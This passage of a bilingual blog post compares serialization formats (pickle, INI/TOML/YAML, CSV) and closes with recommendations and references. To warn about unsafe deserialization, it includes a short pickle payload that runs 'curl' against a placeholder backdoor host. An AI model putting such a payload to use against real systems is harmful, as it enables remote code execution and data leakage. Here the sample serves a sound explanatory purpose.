+<p>The deserialization is usually dangerous when in language specific format. Deserialization usually means code execution, and therefore, malformed data from untrusted source can harm the system that runs the program. It’s the worst choice and generally not recommend to use. Below is an example that a pickled data can send server ip to a backdoor service.</p>
+<p>在语言的特定格式下,反序列化通常是危险的,反序列化通常意味着程序在运行,因此,来源不受信任的数据可能会对正在运行程序的系统造成危害,这是最糟糕的选择,通常是不建议这么做的.下面是一个pickle过的数据将服务端IP发送到一个后门服务端的例子:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data  = <span class="string">"""cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S'curl https://example.com/backdoor'</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pickle.loads(data)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Advantage</p>
+<ul>
+<li>Can support various data types.</li>
+</ul>
+</li>
+<li><p>Disadvantage</p>
+<ul>
+<li><p>DANGEROUS!</p>
+</li>
+<li><p>Can’t be used in other languages.</p>
+</li>
+<li><p>Hard to debug.</p>
+</li>
+</ul>
+</li>
+<li><p>优点</p>
+<ul>
+<li>支持多种数据格式</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li><p>很危险</p>
+</li>
+<li><p>在其他语言中无法使用</p>
+</li>
+<li><p>难以debug</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="others-其他类型"><a href="#others-其他类型" class="headerlink" title="others 其他类型"></a>others 其他类型</h2><p>INI, TOML and YAML are also human readable serialization formats.<br>INI, TOML和YAML也是人可读的序列化格式.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">INI</th>
+<th style="text-align:center">TOML</th>
+<th style="text-align:center">YAML</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">[section]</td>
+<td style="text-align:center">[section]</td>
+<td style="text-align:center">section:</td>
+</tr>
+<tr>
+<td style="text-align:center">key=value</td>
+<td style="text-align:center">key=”value”</td>
+<td style="text-align:center">key:value</td>
+</tr>
+</tbody>
+</table>
+<p>The three serialization formats listed above are often used as configuration file format.</p>
+<p>上面列出的三个序列化格式通常以配置文件的方式使用.</p>
+<ul>
+<li><p>Advantages</p>
+<ul>
+<li><p>Human readable and writable.</p>
+</li>
+<li><p>Well-support libraries.</p>
+</li>
+</ul>
+</li>
+<li><p>Disadvantages</p>
+<ul>
+<li>Not designed for large dataset.</li>
+</ul>
+</li>
+<li><p>优点</p>
+<ul>
+<li><p>人可读可写</p>
+</li>
+<li><p>有很好的支持库</p>
+</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li>不适用于大数据集合</li>
+</ul>
+</li>
+</ul>
+<p>CSV is also a popular serialization format. It’s in plain text format and pretty good for tabular data. Below is an example one row csv file with a header as first line.</p>
+<p>CSV也是一种流程的序列化类型.它采用纯文本的格式,非常适合表格数据,下面是一个csv文件的例子,第一行是标题.</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ISBN,Title</span></span><br><span class="line"><span class="keyword">9780262510875,Structure </span><span class="keyword">and </span>Interpretation of Computer Programs - <span class="number">2</span>nd Edition</span><br></pre></td></tr></table></figure>
+<p>Serializing CSV are pretty easy in Python 3:</p>
+<p>在Python3中非常容易序列化csv数据.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> csv</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">'/tmp/demo.csv'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    writer = csv.writer(f)</span><br><span class="line"><span class="meta">... </span>    writer.writerow([<span class="string">'ISBN'</span>, <span class="string">'Title'</span>])</span><br><span class="line"><span class="meta">... </span>    writer.writerow([<span class="string">'9780262510875'</span>, <span class="string">'Structure and Interpretation of Computer Programs - 2nd Edition'</span>])</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Advantage</p>
+<ul>
+<li><p>Human readable and writable.</p>
+</li>
+<li><p>Good for streaming parsing and large dataset.</p>
+</li>
+<li><p>Good for data with same schema.</p>
+</li>
+<li><p>Non-technical folks can open it in Excel or Google Spreadsheet.</p>
+</li>
+</ul>
+</li>
+<li><p>Disadvantage</p>
+<ul>
+<li><p>Type is limited. Usually values are considered as string only.</p>
+</li>
+<li><p>No good support for binary data.</p>
+</li>
+<li><p>Data structure is limited. It only fits tabular data.</p>
+</li>
+</ul>
+</li>
+<li><p>优点</p>
+<ul>
+<li><p>人可读可写</p>
+</li>
+<li><p>对流处理和大数据集支持地很好</p>
+</li>
+<li><p>适用于具有相同模式的数据</p>
+</li>
+<li><p>非技术人员可以再Excel和Google表格中打开</p>
+</li>
+</ul>
+</li>
+<li><p>缺点</p>
+<ul>
+<li><p>类型太受限,通常都作为string来处理</p>
+</li>
+<li><p>对二进制数据不友好</p>
+</li>
+<li><p>数据结构很受限,只支持表格数据.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Conclusion-结论"><a href="#Conclusion-结论" class="headerlink" title="Conclusion 结论"></a>Conclusion 结论</h1><ul>
+<li><p>JSON is usually your first choice. It’s simple, human readable, and has most widespread support.</p>
+</li>
+<li><p>JSON通常是你的第一选择,它很简单,而且可以直接阅读,编程语言普遍都支持这个格式的数据</p>
+</li>
+<li><p>Use MsgPack instead of JSON if performance is an issue.</p>
+</li>
+<li><p>如果性能是个问题的话那就用MsgPack代替JSON吧.</p>
+</li>
+<li><p>Use Protobuf if type check and schema check is essential. gRPC is recommended as an RPC framework based on Protobuf.</p>
+</li>
+<li><p>如果需要检查数据类型和数据模式,那就使用Protobuf吧,gRPC是一个值得推荐的基于Protobuf的框架.</p>
+</li>
+<li><p>Use Thrift if you’re developing RPC services and don’t like Protobuf syntax.</p>
+</li>
+<li><p>如果你正开发RPC服务,而且不喜欢ProtoBuf的语法,那就使用Thrift.</p>
+</li>
+<li><p>Use TOML if you’re serializing some config files.</p>
+</li>
+<li><p>如果你序列化一些配置文件,那就使用TOML吧</p>
+</li>
+<li><p>Use CSV if you’re serializing data to non-technical people.</p>
+</li>
+<li><p>如果序列化出来的数据是给非技术人员看,那就使用CSV.</p>
+</li>
+<li><p>Use INI if you want something simpler.</p>
+</li>
+<li><p>如果想要简洁一点就用INI文件</p>
+</li>
+<li><p>Use YAML if you want something more complex.</p>
+</li>
+<li><p>如果想要一些复杂的功能,就是用YAML</p>
+</li>
+<li><p>Use language built-in serialization functions or methods if the use case is only limited in a single language, and you<br>don’t care security that much (not good).</p>
+</li>
+<li><p>如果使用场景就是单单一种语言那就使用编程语言自带的序列化功能或者函数,而且你也不需要担心太多安全问题.</p>
+</li>
+</ul>
+<h1 id="References-引用"><a href="#References-引用" class="headerlink" title="References 引用"></a>References 引用</h1><p><a href="https://stackoverflow.com/questions/3429921/what-does-serializable-mean" target="_blank" rel="noopener">Avro</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats" target="_blank" rel="noopener">Comparison of data serialization formats</a></p>
+<p><a href="https://www.benfrederickson.com/dont-pickle-your-data/" target="_blank" rel="noopener">Don’t pickle your data</a></p>
+<p><a href="https://stackoverflow.com/questions/43442194/how-do-i-read-and-write-with-msgpack/43442195" target="_blank" rel="noopener">How do I read and write with msgpack</a></p>
+<p><a href="https://www.tutorialspoint.com/java/java_serialization.htm" target="_blank" rel="noopener">Java serialization</a></p>
+<p><a href="https://msgpack.org/index.html" target="_blank" rel="noopener">Msgpack official website</a></p>
+<p><a href="https://php.net/serialize" target="_blank" rel="noopener">PHP Manual - serialize</a></p>
+<p><a href="https://developers.google.com/protocol-buffers/" target="_blank" rel="noopener">Protocol Buffers</a></p>
+<p><a href="https://www.igvita.com/2011/08/01/protocol-buffers-avro-thrift-messagepack/" target="_blank" rel="noopener">Protocol Buffers, Avro, Thrift &amp; MessagePack</a></p>
+<p><a href="https://docs.python.org/2/library/json.html" target="_blank" rel="noopener">Python Manual - json</a></p>
+<p><a href="http://jmoiron.net/blog/python-serialization/" target="_blank" rel="noopener">Python Serialization</a></p>
+<p><a href="http://ruby-doc.org/core-2.0.0/Marshal.html" target="_blank" rel="noopener">Ruby Manual - Markshal</a></p>
+<p><a href="https://stackoverflow.com/questions/3429921/what-does-serializable-mean" target="_blank" rel="noopener">What does Serializable mean</a></p>
+<p><a href="https://stackoverflow.com/questions/447898/what-is-object-serialization" target="_blank" rel="noopener">What is code serialization</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Serialization" target="_blank" rel="noopener">Wikipedia - Serialization</a></p>
+<p><a href="https://www.w3schools.com/xmL/default.asp" target="_blank" rel="noopener">XML</a></p>
+<p><a href="https://news.ycombinator.com/item?id=2571729" target="_blank" rel="noopener">You’re Using JSON, Why not MessagePack</a></p>
+<h1 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h1><p><a href="https://www.reddit.com/user/vovanz" target="_blank" rel="noopener">@vovanz</a>: helped on performance and JSON streaming API.</p>
+<p><a href="https://www.reddit.com/user/Dogeek" target="_blank" rel="noopener">@Dogeek</a>: helped on configuration serialization.</p>
+<p><a href="https://news.ycombinator.com/user?id=tannhaeuser" target="_blank" rel="noopener">@tannhaeuser</a>: helped on CSV piece.</p>
+<h1 id="Discussion-讨论"><a href="#Discussion-讨论" class="headerlink" title="Discussion 讨论"></a>Discussion 讨论</h1><p><a href="https://news.ycombinator.com/item?id=17226781" target="_blank" rel="noopener">Hackernews</a></p>
+<p><a href="https://www.reddit.com/r/Python/comments/8ogk5o/which_is_your_first_choice_of_data_serialization/" target="_blank" rel="noopener">Reddit</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/25/归并排序与快速排序/" rel="next" title="归并排序与快速排序">
+                <i class="fa fa-chevron-left"></i> 归并排序与快速排序
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/30/AWS网络介绍(译)/" rel="prev" title="AWS网络介绍(译)">
+                AWS网络介绍(译) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar-6.png" alt="Jony Chiao">
+            
+              <p class="site-author-name" itemprop="name">Jony Chiao</p>
+              <p class="site-description motion-element" itemprop="description">bulabula</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/jiaoqiyuan" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jijujiu@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Context-上下文"><span class="nav-number">1.</span> <span class="nav-text">Context 上下文</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Uses-用法"><span class="nav-number">2.</span> <span class="nav-text">Uses 用法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solutions-解决方案"><span class="nav-number">3.</span> <span class="nav-text">Solutions 解决方案</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML"><span class="nav-number">3.1.</span> <span class="nav-text">XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSON"><span class="nav-number">3.2.</span> <span class="nav-text">JSON</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MsgPack"><span class="nav-number">3.3.</span> <span class="nav-text">MsgPack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Protobuf"><span class="nav-number">3.4.</span> <span class="nav-text">Protobuf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Thrift"><span class="nav-number">3.5.</span> <span class="nav-text">Thrift</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Language-Built-in-Serialization"><span class="nav-number">3.6.</span> <span class="nav-text">Language Built-in Serialization</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others-其他类型"><span class="nav-number">3.7.</span> <span class="nav-text">others 其他类型</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion-结论"><span class="nav-number">4.</span> <span class="nav-text">Conclusion 结论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References-引用"><span class="nav-number">5.</span> <span class="nav-text">References 引用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Credit"><span class="nav-number">6.</span> <span class="nav-text">Credit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Discussion-讨论"><span class="nav-number">7.</span> <span class="nav-text">Discussion 讨论</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jony Chiao</span>
+
+  
+</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: 'n2HspM41RbogfYToohbhdzcF-gzGzoHsz',
+        appKey: 'BmbN7noqgmLyN99xJLQfDwYv',
+        placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+        avatar:'retro',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
